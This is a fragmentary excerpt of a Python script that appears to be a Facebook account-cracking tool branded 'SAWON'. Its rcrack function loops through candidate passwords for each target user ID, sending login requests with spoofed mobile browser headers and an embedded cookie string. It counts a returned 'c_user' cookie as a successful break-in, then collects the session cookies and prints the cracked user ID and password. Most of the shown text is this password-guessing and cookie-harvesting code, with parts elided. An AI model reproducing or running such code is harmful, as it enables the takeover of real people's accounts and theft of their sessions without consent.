...
def fuck():
    ...
    print('[+] 2000•4000•6000•80000•15000•50000')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sSAWON\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    # 'cookie': 'datr=Z6oHZlG0x2KvOH61PK8bln2I; sb=Z6oHZl3sV8qEpYYDVt1QWcqi; m_pixel_ratio=2; wd=360x664; fr=0UA5JnwYpP95eFoME..BmB6pn..AAA.0.0.BmB6pq.AWVc_UgVfsQ',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="122", "Google Chrome";v="122"',
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="122.0.6289.220", "Google Chrome";v="122.0.6289.220"',
    'sec-ch-ua-mobile': '?1',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 14; Lenovo TB-X306X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6289.220 Mobile Safari/537.36',
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[SAWON-CP💔] {uid} • {ps}")
